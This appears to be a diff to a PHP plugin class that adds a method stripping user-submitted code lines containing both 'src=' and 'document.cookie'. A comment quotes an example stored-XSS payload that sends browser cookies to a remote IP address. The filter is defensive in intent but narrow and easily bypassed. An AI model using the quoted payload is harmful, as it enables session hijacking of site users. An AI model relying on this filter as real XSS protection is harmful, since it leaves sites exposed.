@@ -538,4 +538,26 @@ class Common_Methods {
         }
     }
 
+    /**
+     * Sanitize user-submitted code from potential security vulnerabilities
+     * 
+     * @since 7.8.7
+     */
+    public function sanitize_html_js_css_code( $code ) {
+        $code_lines = explode( PHP_EOL, $code );
+        $sanitized_code_lines = array();
+        foreach ( $code_lines as $code_line ) {
+            if ( false !== strpos( $code_line, 'src=' ) && false !== strpos( $code_line, 'document.cookie' ) ) {
+                // Do nothing. Do not include the code line in the sanitized code.
+                // Example of malicious code:
+                // 1. Stored XSS vulnerability: <script>new Image().src='http://10.5.7.89:8001/index.php?c='+document.cookie</script>
+                // This line of code will send cookies from users browser to a remote server for exploitation
+            } else {
+                $sanitized_code_lines[] = $code_line;
+            }
+        }
+        $sanitized_code = implode( PHP_EOL, $sanitized_code_lines );
+        return $sanitized_code;
+    }
+
 }
